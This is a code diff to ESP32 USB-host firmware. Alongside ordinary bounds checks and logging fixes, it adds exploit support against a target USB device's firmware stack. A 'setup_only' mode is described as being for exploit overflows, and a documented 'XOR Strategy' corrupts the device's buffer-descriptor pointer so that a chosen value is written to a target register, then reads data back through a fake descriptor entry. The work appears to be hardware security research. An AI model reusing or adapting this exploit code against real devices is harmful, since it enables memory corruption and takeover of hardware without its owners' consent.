@@ -39,6 +39,9 @@ static int recovery_attempts = 0;
 #define MAX_CONSECUTIVE_FAILURES 5  // Reset USB after this many failures
 #define MAX_RECOVERY_ATTEMPTS 3     // Power cycle after this many failed resets
 
+// Flag to indicate device needs reset (set when device connects)
+bool usb_needs_reset = true;
+
 // ============================================================================
 // USB Worker Task (Core 1) - Single Operation Model
 // ============================================================================
@@ -634,6 +637,10 @@ static esp_err_t usb_send_packet_impl(const usb_packet_config_t *config) {
         ESP_LOGE(TAG, "Invalid packet_size: 0 (would hang USB controller)");
         return ESP_ERR_INVALID_ARG;
     }
+    if (config->packet_size > USB_MAX_PACKET_SIZE) {
+        ESP_LOGE(TAG, "Invalid packet_size: %d (max %d)", config->packet_size, USB_MAX_PACKET_SIZE);
+        return ESP_ERR_INVALID_ARG;
+    }
     
     const char* size_status = config->packet_size == 8 ? "(standard)" : 
                               config->packet_size < 8 ? "(TRUNCATED!)" : "(OVERSIZED!)";
@@ -721,10 +728,100 @@ static esp_err_t usb_send_packet_impl(const usb_packet_config_t *config) {
     // Enable channel to send
     usb_dwc_ll_hcchar_enable_chan(chan_regs);
     
-    ESP_LOGI(TAG, "SETUP packet sent");
+    // Wait for SETUP to complete and check result
+    uint32_t setup_start = xTaskGetTickCount();
+    uint32_t setup_hcint = 0;
+    bool setup_acked = false;
     
-    // Wait for transmission (simple delay - baseline approach)
-    vTaskDelay(pdMS_TO_TICKS(10));
+    while ((xTaskGetTickCount() - setup_start) < pdMS_TO_TICKS(50)) {
+        setup_hcint = usb_dwc_ll_hcint_read_and_clear_intrs(chan_regs);
+        if (setup_hcint & USB_DWC_LL_INTR_CHAN_CHHLTD) {
+            if (setup_hcint & USB_DWC_LL_INTR_CHAN_XFERCOMPL) {
+                setup_acked = true;
+                ESP_LOGI(TAG, "SETUP packet ACKed (hcint=0x%02lx)", setup_hcint);
+            } else {
+                ESP_LOGW(TAG, "SETUP failed (hcint=0x%02lx) XACTERR:%d NAK:%d STALL:%d",
+                         setup_hcint,
+                         (setup_hcint & 0x80) ? 1 : 0,  // XACTERR bit 7
+                         (setup_hcint & USB_DWC_LL_INTR_CHAN_NAK) ? 1 : 0,
+                         (setup_hcint & USB_DWC_LL_INTR_CHAN_STALL) ? 1 : 0);
+            }
+            break;
+        }
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+    
+    if (!setup_acked && setup_hcint == 0) {
+        ESP_LOGW(TAG, "SETUP timeout - no response from device");
+    }
+    
+    // If setup_only, return immediately after SETUP (skip DATA/STATUS stages)
+    // This is useful for exploit overflows where we don't want to wait for device response
+    if (config->setup_only) {
+        ESP_LOGI(TAG, "setup_only mode: returning after SETUP (no DATA stage)");
+        return ESP_OK;
+    }
+    
+    // If data_stage_ep is specified, redirect DATA IN to that endpoint
+    if (config->data_stage_ep > 0 && config->expect_response) {
+        ESP_LOGI(TAG, "Redirecting DATA IN to EP%d after EP0 trigger", config->data_stage_ep);
+        
+        // CRITICAL: First, send an IN token to EP0 to trigger USBCtrlTrfInHandler()!
+        // The flow for the XOR Strategy is:
+        // 1. SETUP packet received - hardware DMAs payload over pBDTEntryIn[0]
+        // 2. USBCtrlEPServiceComplete() called - firmware writes wLength to pBDTEntryIn[0]->CNT
+        //    (This is a junk write to target - 2 ^ 8 + 2)
+        // 3. IN token received - USBCtrlTrfInHandler() called
+        // 4. pBDTEntryIn[0] XORed with 0x08 -> Points to target - 2
+        // 5. USBCtrlTrfTxService() called again -> writes wLength to pBDTEntryIn[0]->CNT
+        //    (This is our real target register write!)
+        //
+        // The IN token here is required to trigger steps 3-5.
+        ESP_LOGI(TAG, "Sending IN token to EP0 to trigger XOR and register write...");
+        ESP_LOGI(TAG, "Expected: wLength=%d will be written to target register", config->wLength);
+        
+        // Quick DATA IN to EP0 - just to trigger the write, we don't care about the result
+        uint8_t dummy_buffer[64];
+        size_t dummy_received = 0;
+        esp_err_t ep0_result = usb_read_response(dummy_buffer, sizeof(dummy_buffer), 
+                                                  50,  // Increased timeout back to 50ms
+                                                  &dummy_received,
+                                                  1);  // Just 1 retry
+        
+        if (ep0_result == ESP_OK) {
+            ESP_LOGI(TAG, "EP0 DATA IN succeeded (unexpected but OK), received %zu bytes:", dummy_received);
+            if (dummy_received > 0) {
+                ESP_LOG_BUFFER_HEX_LEVEL(TAG, dummy_buffer, dummy_received > 16 ? 16 : dummy_received, ESP_LOG_INFO);
+            }
+        } else {
+            ESP_LOGI(TAG, "EP0 DATA IN failed as expected (this triggers the register write!)");
+        }
+        
+        // Short delay for hardware to process the register write.
+        vTaskDelay(pdMS_TO_TICKS(20));
+        
+        // Now read from the target endpoint (e.g., EP10) - single attempt only
+        ESP_LOGI(TAG, "Now reading from EP%d (single attempt)...", config->data_stage_ep);
+        
+        // Use endpoint_in to read from the specified endpoint
+        size_t ep_read_len = config->response_buffer_size > 0 ? config->response_buffer_size : 64;
+        if (ep_read_len > 64) {
+            ep_read_len = 64; // Match fake BDT CNT=0x40 to avoid oversized IN
+        }
+        usb_endpoint_params_t ep_params = {
+            .endpoint = config->data_stage_ep,
+            .device_addr = config->device_addr,
+            .ep_type = USB_EP_TYPE_BULK,
+            .channel = 1,
+            .buffer = config->response_buffer,
+            .data = NULL,
+            .length = ep_read_len,
+            .timeout_ms = config->timeout_ms,
+            .bytes_transferred = config->bytes_received
+        };
+        
+        return usb_endpoint_in_impl(&ep_params);
+    }
     
     // Check direction: bit 7 of bmRequestType (0=Host-to-Device, 1=Device-to-Host)
     bool is_host_to_device = (config->bmRequestType & 0x80) == 0;
@@ -735,8 +832,12 @@ static esp_err_t usb_send_packet_impl(const usb_packet_config_t *config) {
     }
     else if (!is_host_to_device && config->expect_response && config->response_buffer != NULL) {
         // DATA IN stage (Device-to-Host)
+        size_t read_len = config->response_buffer_size;
+        if (config->wLength > 0 && config->wLength < read_len) {
+            read_len = config->wLength;
+        }
         return usb_read_response(config->response_buffer, 
-                                config->response_buffer_size,
+                                read_len,
                                 config->timeout_ms,
                                 config->bytes_received,
                                 config->max_nak_retries);
@@ -885,6 +986,11 @@ esp_err_t usb_read_response(uint8_t *buffer, size_t max_len,
     
     // Set DMA buffer for reception - simple direct buffer
     static uint8_t rx_dma_buffer[256] __attribute__((aligned(4)));
+    size_t rx_dma_len = sizeof(rx_dma_buffer);
+    if (max_len > rx_dma_len) {
+        ESP_LOGW(TAG, "Clamping max_len from %zu to %zu (DMA buffer size)", max_len, rx_dma_len);
+        max_len = rx_dma_len;
+    }
     chan_regs->hcdma_reg.dmaaddr = (uint32_t)rx_dma_buffer;
     
     // Clear interrupts AGAIN right before enabling (catches any race conditions)
@@ -1004,7 +1110,9 @@ usb_packet_config_t usb_packet_config_default(void) {
         .max_nak_retries = -1,  // Use default
         .response_buffer = NULL,
         .response_buffer_size = 0,
-        .bytes_received = NULL
+        .bytes_received = NULL,
+        .setup_only = false,
+        .data_stage_ep = 0
     };
     memset(config.extra_data, 0, sizeof(config.extra_data));
     return config;
@@ -1033,7 +1141,6 @@ static esp_err_t usb_get_device_info_impl(usb_device_info_t *info) {
     }
     
     // Send reset if device recently connected (before fetching descriptor)
-    extern bool usb_needs_reset;
     if (usb_needs_reset) {
         ESP_LOGI(TAG, "Sending USB reset before fetching device info...");
         usb_send_reset_impl();
@@ -1133,9 +1240,6 @@ static esp_err_t usb_endpoint_in_impl(const usb_endpoint_params_t *params) {
 
     int chhltd_retries = 0;
 
-    ESP_LOGI(TAG, "EP%d IN: Reading up to %zu bytes (addr=%d, timeout=%ldms)",
-             params->endpoint, params->length, params->device_addr, params->timeout_ms);
-
     const int chan_num = params->channel;  // Use configurable channel
     volatile usb_dwc_host_chan_regs_t *chan_regs = &hal_context.dev->host_chans[chan_num];
 
@@ -1167,13 +1271,15 @@ static esp_err_t usb_endpoint_in_impl(const usb_endpoint_params_t *params) {
     static uint8_t ep_rx_buffer[256] __attribute__((aligned(4)));
     size_t rx_len = (params->length > sizeof(ep_rx_buffer)) ? sizeof(ep_rx_buffer) : params->length;
     memset(ep_rx_buffer, 0, sizeof(ep_rx_buffer));
+    ESP_LOGI(TAG, "EP%d IN: Reading up to %zu bytes (addr=%d, timeout=%ldms)",
+             params->endpoint, rx_len, params->device_addr, params->timeout_ms);
 
     // Configure transfer size
     usb_dwc_ll_hctsiz_init(chan_regs);
     chan_regs->hctsiz_reg.xfersize = rx_len;
     chan_regs->hctsiz_reg.pktcnt = (rx_len + 63) / 64;
-    // Use DATA0 for both interrupt and bulk IN (standard USB start)
-    usb_dwc_ll_hctsiz_set_pid(chan_regs, 0);
+    // Single attempt: use DATA1 to match STAT=0xC8 in the fake BDT entry
+    usb_dwc_ll_hctsiz_set_pid(chan_regs, 1);
 
     // Set DMA address
     chan_regs->hcdma_reg.dmaaddr = (uint32_t)ep_rx_buffer;
@@ -1223,7 +1329,13 @@ static esp_err_t usb_endpoint_in_impl(const usb_endpoint_params_t *params) {
                 continue;
             }
 
-            ESP_LOGW(TAG, "EP%d IN: Error (hcint=0x%lx)", params->endpoint, hcint);
+            // Decode hcint bits for debugging (bit 7 = XACTERR)
+            ESP_LOGW(TAG, "EP%d IN: Error (hcint=0x%02lx) XFERCOMPL:%d NAK:%d STALL:%d XACTERR:%d", 
+                     params->endpoint, hcint,
+                     (hcint & USB_DWC_LL_INTR_CHAN_XFERCOMPL) ? 1 : 0,
+                     (hcint & USB_DWC_LL_INTR_CHAN_NAK) ? 1 : 0,
+                     (hcint & USB_DWC_LL_INTR_CHAN_STALL) ? 1 : 0,
+                     (hcint & 0x80) ? 1 : 0);  // XACTERR = bit 7
             return ESP_FAIL;
         }
 
